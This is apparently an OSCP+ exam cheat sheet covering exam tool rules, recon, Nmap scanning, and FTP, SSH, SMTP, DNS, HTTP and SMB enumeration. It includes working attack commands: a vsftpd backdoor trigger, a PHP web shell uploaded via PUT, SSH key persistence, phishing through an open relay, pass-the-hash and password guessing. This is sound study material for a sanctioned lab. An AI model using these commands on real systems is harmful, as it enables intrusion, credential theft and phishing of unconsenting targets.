hostname & whoami & ipconfig & type C:\Users\Administrator\Desktop\proof.txt

# Windows PowerShell
hostname; whoami; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
```

Take the screenshot with the target IP and flag visible together, submit the value before the attack window ends, then save the exact path/command/screenshot name in your report notes.

### 0.6 High-yield finding → validation trees

#### Linux: `sudo -l` shows an allowed command

```text
allowed entry
→ note exact user, command, arguments, wildcards, SETENV and password requirement
→ inspect referenced script/binary and every parent directory
→ check GTFOBins for that exact mode (sudo/shell/file-write/library-load)
→ prefer direct documented behavior over an unrelated CVE
→ validate with a harmless identity/file-read action
→ execute minimum change → root shell → proof
```

```bash
sudo -l
namei -l /path/to/allowed/script 2>/dev/null
file /path/to/allowed/binary
strings /path/to/allowed/binary | less
sudo -V | sed -n '1,25p'
```

#### Linux: custom SUID binary

```text
custom SUID
→ owner/mode/architecture
→ strings + imported functions + filesystem/process trace
→ relative command?        → controlled PATH test
→ relative library/RPATH?  → controlled library test
→ writable config/file?    → back up and test parser/behavior
→ user-controlled args?    → injection/traversal/file primitive
→ safe proof → root shell → evidence
```

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /path/custom-suid; file /path/custom-suid
strings -a /path/custom-suid | less
ldd /path/custom-suid 2>/dev/null
readelf -d /path/custom-suid 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
strace -f -o /tmp/suid.trace /path/custom-suid 2>/dev/null
```

#### Linux: root cron/systemd target appears writable

```text
root job/timer/service
→ prove who executes it and when
→ resolve exact target and interpreter
→ inspect owner/mode/ACL of file AND parent directories
→ inspect arguments, environment and search path
→ back up original
→ make the smallest reversible change
→ observe execution → root shell → restore → evidence
```

```bash
systemctl list-timers --all
systemctl cat NAME.service NAME.timer 2>/dev/null
pspy64
namei -l /path/to/target
getfacl /path/to/target 2>/dev/null
```

#### Windows: `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

```text
privilege enabled
→ record identity, integrity and service context
→ confirm OS build/architecture and reachable callback
→ choose one compatible named-pipe/token technique from the full section
→ start listener and transfer exact architecture
→ execute once → verify whoami → proof
→ if it fails: read error, verify privilege is enabled, pipe trigger and callback path
```

```cmd
whoami /all
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
ipconfig
```

#### Windows: service or scheduled task

```text
service/task
→ privileged run account
→ exact command/binary/arguments/working directory
→ writable binary, script, config or parent directory
→ can you restart/trigger it, or when will it run?
→ back up original + record ACL
→ minimal reversible payload/change
→ trigger → privileged shell → restore → evidence
```

```cmd
sc qc SERVICE
sc query SERVICE
schtasks /query /fo LIST /v
icacls "C:\path\to\binary-or-script"
accesschk.exe -uwcqv "%USERNAME%" *
```

#### Active Directory: BloodHound/ACL edge

```text
edge
→ confirm current principal, target object and exact right with a second method
→ read current owner/DACL/attribute/group state
→ save a backup/export and define rollback
→ identify the access the edge should produce
→ make only the minimum required change
→ validate authentication/authorization on the resulting protocol
→ re-collect/re-enumerate as the new identity
→ restore temporary object changes when the objective permits
```

#### Tool failure: do not randomly switch tools

```text
read exact error
→ classify: route / DNS / time / TLS / auth format / authorization / version syntax / target state
→ verify with one native/manual request
→ check local --help and installed version
→ try one alternate implementation
→ same failure with prerequisites proven? lower confidence and park
→ different result? update the hypothesis; do not erase earlier evidence
```

</details>


<details>
<summary>🚫 2026 EXAM RULES — READ BEFORE USING ANY TOOL</summary>

> **This block overrides older habits in the rest of the notes.**
> Checked against the OffSec OSCP+ Exam Guide, FAQ and AI policy on 06 Sep 2026.

### Prohibited on the OSCP+ exam

```text
SQLmap / SQLninja and similar automatic exploitation tools
Mass vulnerability scanners (Nessus, OpenVAS, Nexpose, etc.)
IP / ARP / DNS / NBNS spoofing
Responder LLMNR/NBT-NS poisoning or other spoofing
Commercial offensive tools/services such as Burp Pro / Metasploit Pro
AI/LLM chatbots during the exam
AI/LLM chatbots during the reporting phase
```

### Metasploit restriction — important

```text
Auxiliary modules  ┐
Exploit modules    ├─ ONE target machine total
Post modules       │
Meterpreter        ┘

"check" also counts toward the selected target restriction.
Once you use restricted Metasploit functionality on Target A,
do NOT use it on Target B.

Metasploit may NOT be used for pivoting.

Allowed against all targets:
  msfvenom
  exploit/multi/handler

Meterpreter itself remains limited to the one selected target.
```

### Responder

The **Responder tool itself is listed as allowed**, but **poisoning and spoofing are not allowed**. Therefore, use **analyze mode only** and do not perform LLMNR/NBT-NS poisoning or spoofing.

### Allowed/open-book behavior

- Nmap/NSE, Nikto, Burp **Free/Community**, DirBuster and normal manual tools are allowed when they do not perform a restricted action.
- BloodHound Legacy/CE, SharpHound, PowerView, Rubeus, evil-winrm, Mimikatz, Impacket and PrintSpoofer are listed by OffSec as allowed examples.
- Online notes/resources are allowed, but do **not** ask another person/community for exam help.
- All exam activity should be performed on the proctored host.
- PowerShell Core / PSSession is accepted as an interactive shell under the current FAQ.
- The guide forbids downloading applications, files, or source code from the exam environment to your local machine unless they are necessary to compromise the target; delete any such local copy after completing the objective.
- Online guessing is not a default enumeration step: check scope, lockout/rate-limit risk and known usernames first; use an evidence-based shortlist and stop when the signal does not improve.
- In the report, make every target/IP unambiguous and verify section order against the control panel; OffSec states that machines are graded and valued in the order documented.
- Create the final `.7z` on Kali, visually review the PDF, compare the upload MD5, and click the final **Submit File** button.
- Always re-check the official guide on exam day because tool rules can change.

Official references:

- https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
- https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ
- https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams

</details>


<details>


<summary>📋 TABLE OF CONTENTS</summary>






     1.  Pre-Engagement Setup
     2.  Reconnaissance & Host Discovery
     3.  Nmap & Port Scanning
     4.  Service Enumeration — All Ports
     5.  Vulnerability Identification
     6.  Web Application Attacks
     7.  Exploitation — Initial Access
     8.  Password Attacks & Credential Abuse
     9.  Active Directory — Full Attack Chain
    10.  Post-Exploitation — Linux
    11.  Post-Exploitation — Windows
    12.  Privilege Escalation — Linux (Every Vector)
    13.  Privilege Escalation — Windows (Every Vector)
    14.  Lateral Movement & Pivoting
    15.  File Transfers — Every Method
    16.  Antivirus Evasion & Defense Bypass
    17.  Buffer Overflow — Windows x86 (Complete)
    18.  Reporting & Documentation
    19.  Quick Reference Card
    20.  Exam Day Checklist
    🔥  Bonus: Most Missed Tricks


</details>


------------------------------------------------------------------------

## 1. PRE-ENGAGEMENT SETUP


<details>


<summary>⚙️ 1.1 Environment & Variables</summary>






``` bash
# Set once, use everywhere
export IP=10.10.10.x
export LHOST=10.10.14.x       # Your tun0 IP
export LPORT=4444
export DOMAIN=domain.local
export DC=dc01.domain.local

# Get your tun0 IP automatically
export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

# Confirm
echo "[*] Target: $IP | LHOST: $LHOST:$LPORT"
```


</details>


<details>


<summary>📁 1.2 Directory Structure</summary>






``` bash
mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
cd ~/oscp/$IP

# Fast template function — add to ~/.bashrc
function newbox() {
  export IP=$1
  mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
  cd ~/oscp/$IP
  echo "[+] Workspace ready for $IP"
}
# Usage: newbox 10.10.10.x
```


</details>


<details>


<summary>🖥️ 1.3 tmux Setup (NEVER work without it)</summary>






``` bash
# Record everything
script -q -c "zsh" ~/oscp/$IP/terminal_$(date +%Y%m%d_%H%M).log

# Start session
tmux new -s oscp

# Essential keybinds:
# Ctrl+B %       → Split vertical
# Ctrl+B "       → Split horizontal
# Ctrl+B o       → Switch pane
# Ctrl+B z       → Zoom pane (fullscreen toggle)
# Ctrl+B [       → Scroll mode (q to exit)
# Ctrl+B d       → Detach (session stays alive)
# tmux attach    → Reattach

# Recommended 4-pane layout:
# ┌─────────────┬─────────────┐
# │  nmap/enum  │ shell/nc    │
# ├─────────────┼─────────────┤
# │  exploit    │ notes/misc  │
# └─────────────┴─────────────┘
```


</details>


<details>


<summary>📚 1.4 Wordlists --- Every Important Path</summary>






``` bash
# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

# Web content discovery
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  # Parameter fuzzing

# DNS
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Usernames
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/Names/names.txt

# SNMP
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt

# FTP/SSH/SMB bruteforce
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
```


</details>


<details>


<summary>🛠️ 1.5 Tool Verification --- Confirm These Are Installed</summary>






``` bash
which nmap autorecon gobuster feroxbuster ffuf nikto whatweb wpscan \
      hydra hashcat john nxc impacket-psexec evil-winrm \
      bloodhound-ce-python responder ligolo-ng chisel socat msfconsole \
      searchsploit enum4linux-ng smbclient smbmap ldapsearch snmpwalk \
      burpsuite

# EXAM RULE REMINDERS:
# - Kali burpsuite = Community/Free: allowed.
# - Burp Pro/commercial offensive services: prohibited.
# - SQLmap: PROHIBITED on OSCP+; no SQLmap workflow is included here.

# Use Kali packages or isolated pipx environments; verify the resulting
# command's local --help before the exam rather than changing versions mid-path.
gem install wpscan
```


</details>


<details>


<summary>🔥 1.6 Pre-Exam Checklist</summary>






    [ ] VPN connected — verify with: ping $IP
    [ ] tun0 interface up — ip a show tun0
    [ ] Burp Suite running, proxy configured
    [ ] /etc/hosts ready to add entries
    [ ] Note-taking app open (Obsidian/CherryTree)
    [ ] Terminal logged (script command)
    [ ] Exam control panel open
    [ ] Screenshots folder ready
    [ ] Known good shells: nc listener test, msfvenom test payload
    [ ] Clock started — note exam end time
    [ ] ProtonVPN/any other VPN DISCONNECTED (use only exam VPN)
    [ ] Phone on silent — no interruptions
    [ ] Water, snacks ready


</details>


------------------------------------------------------------------------

## 2. RECONNAISSANCE & HOST DISCOVERY


<details>


<summary>🌐 2.1 Network Sweep --- Find Live Hosts</summary>






``` bash
# Ping sweep
nmap -sn 10.10.10.0/24 --open -oN scans/nmap/hosts.txt

# ARP scan (more reliable on local network)
netdiscover -r 10.10.10.0/24 -i tun0
arp-scan -l

# fping
fping -a -g 10.10.10.0/24 2>/dev/null

# Range discovery only when scope/routing justifies it; validate every result with Nmap
masscan -p0-65535 10.10.10.0/24 --rate=10000
```


</details>


<details>


<summary>📝 2.2 /etc/hosts Management</summary>






``` bash
# Add target to hosts
echo "$IP domain.local dc01.domain.local" >> /etc/hosts

# Tip: Always check if web app needs hostname vs IP
# Some apps only respond to hostname (virtual hosting)
curl -H "Host: domain.local" http://$IP/

# Vhost discovery
gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$IP -H "Host: FUZZ.domain.local" -fs 0
```


</details>


------------------------------------------------------------------------

## 3. NMAP & PORT SCANNING


<details>


<summary>🔍 3.1 Nmap Workflow --- Fast Default, Adaptive Rate</summary>






``` bash
# STEP 0: Create output directory once
mkdir -p scans/nmap

# STEP 1: Full TCP scan — conservative VPN baseline; adapt to packet loss
sudo nmap -Pn -n -p- --min-rate 1000 -oA scans/nmap/tcp-all $IP &
# If results look sparse or packets drop, reduce/remove --min-rate and retry a small known set.

# STEP 2: Meanwhile, top 1000 with scripts (quicker results while full scan runs)
sudo nmap -Pn -n -sC -sV --top-ports 1000 -oA scans/nmap/tcp-initial $IP &

# STEP 3: When all-ports finishes, targeted deep scan
ports=$(awk -F/ '/^[0-9]+\/tcp[[:space:]]+open/{print $1}' scans/nmap/tcp-all.nmap | paste -sd, -)
echo "Open ports: $ports"
test -n "$ports" && sudo nmap -Pn -n -sC -sV -p "$ports" -oA scans/nmap/tcp-detail $IP

# STEP 4: Targeted UDP when the host role, TCP results or remaining hypothesis justifies it
sudo nmap -Pn -n -sU --top-ports 100 -oA scans/nmap/udp-top100 $IP &
# Critical UDP: 53,67,68,69,111,123,137,138,139,161,162,500,514,1194,1900

# STEP 5: Run only a selected, relevant NSE script after reviewing its behavior
SCRIPT='<relevant-script>'
nmap --script-help "$SCRIPT"
test -n "$ports" && sudo nmap -Pn -n --script "$SCRIPT" -p "$ports" -oA scans/nmap/nse-selected $IP

# STEP 6: OS detection only when it will change the next decision
test -n "$ports" && sudo nmap -Pn -n -O --osscan-guess -p "$ports" -oA scans/nmap/os $IP
```


</details>


<details>


<summary>⚡ 3.2 Nmap Tips & Tricks</summary>






``` bash
# Adaptive speed: start conservatively; fast but incomplete output wastes more time.
# Raise rate only after confirming the VPN/target tolerates it. If results look sparse,
# lower/remove --min-rate and restore normal retries before trusting the port map.
--min-rate 1000

# If firewall dropping packets — use these
nmap -sS -p$ports $IP              # SYN scan
nmap -sA -p$ports $IP              # ACK scan (firewall rules)
nmap -sN -p$ports $IP              # NULL scan
nmap -sF -p$ports $IP              # FIN scan

# If host appears "down" but you know it's up
nmap -Pn $IP                       # Skip host discovery
nmap -Pn --disable-arp-ping $IP

# Scan through proxychains (for pivoting)
proxychains nmap -sT -Pn -p 80,443,445,22,3389 192.168.x.x

# Output all formats at once
nmap -sC -sV -p$ports $IP -oA scans/nmap/targeted

# Extract just open port numbers from result
grep "open" scans/nmap/targeted.txt | awk '{print $1}' | cut -d'/' -f1

# Parse nmap XML with python (automation)
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scans/nmap/targeted.xml')
for port in tree.findall('.//port[@protocol=\"tcp\"]'):
    state = port.find('state').get('state')
    if state == 'open':
        print(port.get('portid'), port.find('service').get('name',''), port.find('service').get('product',''))
"
```


</details>


<details>


<summary>🚀 3.3 AutoRecon — Background Assistant, Manual Enumeration Still Primary</summary>






``` bash
# Basic
sudo autorecon $IP

# Multiple targets
sudo autorecon 10.10.10.1 10.10.10.2 10.10.10.3

# With options
sudo autorecon $IP --single-target --output ~/oscp/$IP/scans

# Autorecon output structure:
# results/$IP/
# ├── scans/
# │   ├── _quick_tcp_nmap.txt
# │   ├── _full_tcp_nmap.txt
# │   ├── _top_20_udp_nmap.txt
# │   ├── tcp80/            ← web enum if port 80 found
# │   ├── tcp445/           ← smb enum if port 445 found
# │   └── ...
# └── report/

# TIP: While AutoRecon runs, manually enumerate the highest-signal services.
# Do NOT let automated output become a substitute for reading Nmap/service output.
# Recent 2026 exam feedback repeatedly mentions missed clues sitting directly in tool output.
# Work in parallel, but maintain one concise findings table per target.
```


</details>


------------------------------------------------------------------------

## 4. SERVICE ENUMERATION --- EVERY PORT


<details>


<summary>📁 4.1 FTP --- Port 21</summary>






``` bash
# ── FINGERPRINT ──────────────────────────────────────────────
banner=$(nc -nv $IP 21 2>&1 | head -1)
echo $banner                     # Note version!
searchsploit $(echo $banner | awk '{print $1,$2}')

# ── ANONYMOUS LOGIN ───────────────────────────────────────────
ftp $IP
# user: anonymous  pass: (blank) or anonymous@domain.com or press Enter
ftp> ls -la              # Show hidden files
ftp> pwd                 # Where are we?
ftp> binary              # ALWAYS set binary mode before downloading
ftp> get file.txt
ftp> mget *              # Get all files
ftp> put shell.php       # Upload if writable!
ftp> passive             # Toggle passive mode if connection issues

# ── RECURSIVE DOWNLOAD ────────────────────────────────────────
wget -m --no-passive ftp://anonymous:anonymous@$IP
wget -m ftp://user:pass@$IP
# List the root directory without embedding credentials in shell history:
curl --user 'anonymous:' --list-only "ftp://$IP/"

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -L users.txt -P "$SHORTLIST" $IP ftp -t 2 -V
test -s "$SHORTLIST" && medusa -h $IP -U users.txt -P "$SHORTLIST" -M ftp -t 2

# ── NMAP SCRIPTS ──────────────────────────────────────────────
nmap -Pn -n --script ftp-anon,ftp-syst -p21 $IP

# ── KNOWN VULNERABILITIES ─────────────────────────────────────
# vsftpd 2.3.4 → BACKDOOR → connects on port 6200 after :) in username
nmap --script ftp-vsftpd-backdoor $IP
# Manual trigger:
echo -e "USER user:)\nPASS pass" | nc $IP 21
nc $IP 6200         # Should give shell

# ProFTPd mod_copy → unauthenticated file copy (CVE-2015-3306)
nc $IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Then curl http://$IP/passwd.txt

# ── TIPS ──────────────────────────────────────────────────────
# Always check:
#   - config files (.conf, .ini, .cfg)
#   - .bash_history
#   - backup files (.bak, .old, .zip)
#   - Database dumps (.sql)
#   - SSH keys (id_rsa, authorized_keys)
```


</details>


<details>


<summary>🔐 4.2 SSH --- Port 22</summary>






``` bash
# ── FINGERPRINT ───────────────────────────────────────────────
ssh -V
nc -nv $IP 22 2>&1 | head -1     # Banner = version
nmap -sV -p22 $IP                 # Also shows version

# ── ALGORITHM ENUMERATION ─────────────────────────────────────
nmap --script ssh2-enum-algos -p22 $IP
ssh -o "KexAlgorithms=+diffie-hellman-group1-sha1" user@$IP  # Old algos
# If "no matching key exchange" error:
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 user@$IP

# ── USER ENUMERATION (CVE-2018-15473) ─────────────────────────
python3 /usr/share/exploitdb/exploits/linux/remote/45233.py $IP 22 root
# Or:
# MSF ONE-TARGET LOCK — only after choosing this target: use auxiliary/scanner/ssh/ssh_enumusers

# ── PRIVATE KEY USAGE ─────────────────────────────────────────
chmod 600 id_rsa
ssh -i id_rsa user@$IP
ssh -i id_rsa user@$IP -p 2222   # Custom port
# If passphrase protected:
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
hashcat -m 22921 id_rsa.hash rockyou.txt

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -l root -P "$SHORTLIST" $IP ssh -t 2 -f
test -s "$SHORTLIST" && hydra -L users.txt -P "$SHORTLIST" $IP ssh -t 2 -f

# ── COMMON DEFAULT CREDS ──────────────────────────────────────
# root:root | admin:admin | pi:raspberry | vagrant:vagrant
# ubuntu:ubuntu | user:user | guest:guest

# ── USEFUL FLAGS ──────────────────────────────────────────────
ssh -o StrictHostKeyChecking=no user@$IP            # Skip host check
ssh -o UserKnownHostsFile=/dev/null user@$IP        # Don't save to known_hosts
ssh user@$IP -L 8080:localhost:80                   # Local port forward
ssh user@$IP -D 1080                                # SOCKS proxy
ssh user@$IP -N -f -L 8080:127.0.0.1:80            # Background tunnel

# ── WRITE AUTHORIZED_KEYS (if .ssh dir writable) ──────────────
ssh-keygen -t rsa -b 4096 -f /tmp/oscp_key -N ""
cat /tmp/oscp_key.pub     # Copy this
# On target:
echo "PUBKEY" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
# Connect:
ssh -i /tmp/oscp_key user@$IP

# ── CVEs ──────────────────────────────────────────────────────
# OpenSSH < 7.7 → User enumeration (CVE-2018-15473)
# OpenSSH 7.2p1 → Xauth injection
searchsploit openssh 7.2
```


</details>


<details>


<summary>📧 4.3 SMTP --- Port 25 / 465 / 587</summary>






``` bash
# ── FINGERPRINT ───────────────────────────────────────────────
nc -nv $IP 25
nmap -sV --script smtp-commands,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25 $IP

# ── USER ENUMERATION ──────────────────────────────────────────
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP -D domain.com

# Manual:
nc -nv $IP 25
EHLO test
VRFY root
VRFY admin
VRFY www-data
EXPN root       # Expand alias
RCPT TO:root    # Check if user exists

# ── SEND PHISHING MAIL (if open relay) ────────────────────────
swaks --to victim@domain.com --from admin@domain.com --server $IP
swaks --to victim@domain.com --from admin@domain.com --server $IP \
      --body "Click: http://$LHOST/file" --header "Subject: Important"

# ── MAIL WITH ATTACHMENT (Phishing) ───────────────────────────
swaks --to victim@domain.com --from admin@domain.com --server $IP \
      --attach /path/to/malicious.file --header "Subject: Report"

# ── RELAY TEST ────────────────────────────────────────────────
nmap --script smtp-open-relay $IP -p25
# If relay open → use to enumerate internal users, phish, or pivot
```


</details>


<details>


<summary>🌐 4.4 DNS --- Port 53</summary>






``` bash
# ── BASIC QUERIES ─────────────────────────────────────────────
dig @$IP domain.com
dig @$IP domain.com ANY
nslookup domain.com $IP

# ── ZONE TRANSFER (massive info dump — try ALWAYS) ────────────
dig axfr @$IP domain.com
dig axfr @$IP $(dig @$IP +short SOA domain.com | awk '{print $1}')
# dnsrecon:
dnsrecon -d domain.com -t axfr -n $IP
# If zone transfer works — add ALL discovered hosts to /etc/hosts

# ── REVERSE DNS ───────────────────────────────────────────────
dig -x $IP @$IP
nmap -R -sL $IP/24    # Reverse lookup entire subnet

# ── SUBDOMAIN BRUTE FORCE ─────────────────────────────────────
dnsrecon -d domain.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt -n $IP
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $IP:53
fierce --domain domain.com --dns-servers $IP
amass enum -d domain.com -r $IP

# ── DNSSEC ────────────────────────────────────────────────────
dig @$IP domain.com DNSKEY
dig @$IP domain.com DS

# ── TIPS ──────────────────────────────────────────────────────
# DNS on TCP = zone transfer
# DNS on UDP = normal queries
# If port 53 TCP open → zone transfer likely possible
# Always try: dig axfr — worst case is REFUSED
# Discovered hosts → add to /etc/hosts → re-run web enum
```


</details>


<details>


<summary>🌍 4.5 HTTP / HTTPS --- Ports 80, 443, 8080, 8443, 8000, 8888</summary>






``` bash

# __ Nginx _________________
https://github.com/DepthFirstDisclosures/Nginx-Rift

# ── INITIAL FINGERPRINT ───────────────────────────────────────
whatweb http://$IP -a 3    # -a 3 = aggressive
curl -I http://$IP          # Headers (Server, X-Powered-By, etc.)
curl -sL http://$IP | head -100   # Quick source check

# ── CONTENT DISCOVERY COMBO (run all simultaneously) ──────────
# Gobuster — fast, reliable
# try DirBuster-2007_directory-list-2.3-medium.txt if you get nothing from raft
gobuster dir -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,asp,aspx,jsp,py,rb,bak,old,zip,gz,sql,json,xml,config \
  -t 50 -o scans/web/gobuster.txt

# Feroxbuster — recursive (finds /admin/login, /api/v1/users etc.)
feroxbuster -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,asp,aspx -t 50 --depth 3 -o scans/web/ferox.txt

# FFUF — best for parameter fuzzing
ffuf -u http://$IP/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -o scans/web/ffuf.txt -of md

# Nikto — vuln scanner
nikto -h http://$IP -output scans/web/nikto.txt -Format txt

# ── MANUAL CHECKS (do these by hand!) ────────────────────────
# Essential paths to always check:
curl -s http://$IP/robots.txt
curl -s http://$IP/sitemap.xml
curl -s http://$IP/.git/HEAD            # Exposed git repo!
curl -s http://$IP/.git/config
curl -s http://$IP/.env                 # Environment vars
curl -s http://$IP/config.php
curl -s http://$IP/phpinfo.php
curl -s http://$IP/wp-config.php
curl -s http://$IP/web.config
curl -s http://$IP/.htaccess
curl -s http://$IP/backup.zip
curl -s http://$IP/admin/
curl -s http://$IP/api/
curl -s http://$IP/swagger.json         # API docs
curl -s http://$IP/api/swagger.json
curl -s http://$IP/server-status        # Apache status

# ── VHOST / SUBDOMAIN DISCOVERY ──────────────────────────────
# If domain name is known:
gobuster vhost -u http://domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -u http://$IP -H "Host: FUZZ.domain.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP)    # Filter by default response size

# ── HTTPS SPECIFIC ────────────────────────────────────────────
# Check certificate for hostnames/emails
openssl s_client -connect $IP:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "DNS:|Subject:"
# SSL vulnerabilities
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -p 443 $IP
sslscan $IP:443
testssl.sh $IP

# ── PARAMETER FUZZING ─────────────────────────────────────────
# Find hidden parameters on a page
ffuf -u "http://$IP/page.php?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP/page.php)

# ── HTTP METHODS ──────────────────────────────────────────────
curl -X OPTIONS http://$IP/ -v
# If PUT allowed:
curl -X PUT http://$IP/shell.php -d "<?php system(\$_GET['cmd']); ?>"
# If TRACE allowed → Cross-Site Tracing possible

# ── DEFAULT CREDENTIALS TABLE ─────────────────────────────────
# Always check these on every web app:
# Tomcat:        admin:admin | tomcat:tomcat | admin:s3cr3t | tomcat:s3cr3t
# Jenkins:       admin:admin | admin:(blank)
# phpMyAdmin:    root:(blank) | root:root | root:toor
# Nagios:        nagiosadmin:nagios
# Grafana:       admin:admin
# Kibana:        elastic:changeme
# Splunk:        admin:changeme
# WebLogic:      weblogic:weblogic | weblogic:welcome1
# JBoss:         admin:admin
# Glassfish:     admin:adminadmin
# Roundcube:     admin:admin
# Zabbix:        Admin:zabbix
# Cacti:         admin:admin
# OpenVPN AS:    admin:admin
# Plex:          admin:admin
# Netdata:       (no auth by default)
# Home Assistant:(no pass by default)

# ── TECHNOLOGY-SPECIFIC PATHS ─────────────────────────────────
# WordPress:  /wp-login.php /wp-admin /wp-json/wp/v2/users /xmlrpc.php
# Drupal:     /user/login /node/add /admin/config
# Joomla:     /administrator /configuration.php.bak
# Laravel:    /.env /storage/logs/laravel.log
# Rails:      /rails/info/properties /rails/info/routes
# Django:     /admin /static/admin
# Node/Express: /api/ /__express/ 
# Spring:     /actuator /actuator/env /actuator/heapdump /h2-console
# Struts:     *.action *.do
```


</details>


<details>


<summary>🖥️ 4.6 SMB --- Ports 139, 445</summary>






``` bash
# ── FINGERPRINT ───────────────────────────────────────────────
nmap -sV -p139,445 $IP
nmap --script smb-os-discovery,smb-security-mode,smb2-security-mode -p445 $IP
nxc smb $IP   # Shows OS, hostname, domain, SMB signing status

# ── NULL SESSION / ANONYMOUS ──────────────────────────────────
smbclient -L //$IP -N                     # List shares (no auth)
smbmap -H $IP                             # Map shares
smbmap -H $IP -u '' -p ''                 # Explicit null
smbmap -H $IP -u 'guest' -p ''
nxc smb $IP --shares -u '' -p ''
nxc smb $IP --shares -u 'guest' -p ''

# ── CONNECT TO SHARES ─────────────────────────────────────────
smbclient //$IP/SHARE -N
smbclient //$IP/SHARE -U "user%password"
smbclient //$IP/SHARE -U "domain\\user%password"
# Inside smbclient:
smb: \> ls              # List
smb: \> recurse ON      # Enable recursive
smb: \> ls              # Now lists recursively
smb: \> prompt OFF      # Disable confirmation
smb: \> mget *          # Download everything
smb: \> put shell.asp   # Upload shell

# ── RECURSIVE DOWNLOAD ALL ────────────────────────────────────
smbclient //$IP/SHARE -N -c 'recurse;prompt;mget *'
smbget -R smb://$IP/SHARE -U 'user%pass'
# Mount (easier for browsing):
mkdir /mnt/smb
mount -t cifs //$IP/SHARE /mnt/smb -o user=,password=
mount -t cifs //$IP/SHARE /mnt/smb -o user=user,password=pass,domain=DOMAIN

# ── FULL ENUMERATION ──────────────────────────────────────────
enum4linux -a $IP 2>/dev/null | tee scans/smb/enum4linux.txt
enum4linux-ng $IP -A -oA scans/smb/enum4linux-ng 2>/dev/null

# nxc full sweep
nxc smb $IP -u user -p pass --shares
nxc smb $IP -u user -p pass --sessions
nxc smb $IP -u user -p pass --users
nxc smb $IP -u user -p pass --groups
nxc smb $IP -u user -p pass --computers
nxc smb $IP -u user -p pass --loggedon-users
nxc smb $IP -u user -p pass --disks
nxc smb $IP -u '' -p '' --rid-brute


# ── VULNERABILITY CHECKS ──────────────────────────────────────
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos -p445 $IP

# EternalBlue (MS17-010) manual check:
python3 checker.py $IP    # From exploit repo

# ── PASS THE HASH VIA SMB ─────────────────────────────────────
nxc smb $IP -u user -H NTLMHASH
nxc smb $IP -u Administrator -H HASH --sam
smbclient //$IP/SHARE -U user --pw-nt-hash NTLMHASH

# ── TIPS ──────────────────────────────────────────────────────
# Always look for:
#   - passwords in .txt .doc .xlsx .conf files
#   - scripts that run as another user (check scheduled tasks)
#   - writable shares → upload shell → find execution vector
#   - .ini files (autorun.ini can execute on connect)
#   - Sysvol/NETLOGON → Group Policy → GPP passwords (cpassword)
# GPP password decrypt:
gpp-decrypt "ENCRYPTEDPASSWORD"
# Or find in: \\DC\SYSVOL\domain\Policies\**\Groups.xml
```


</details>


<details>


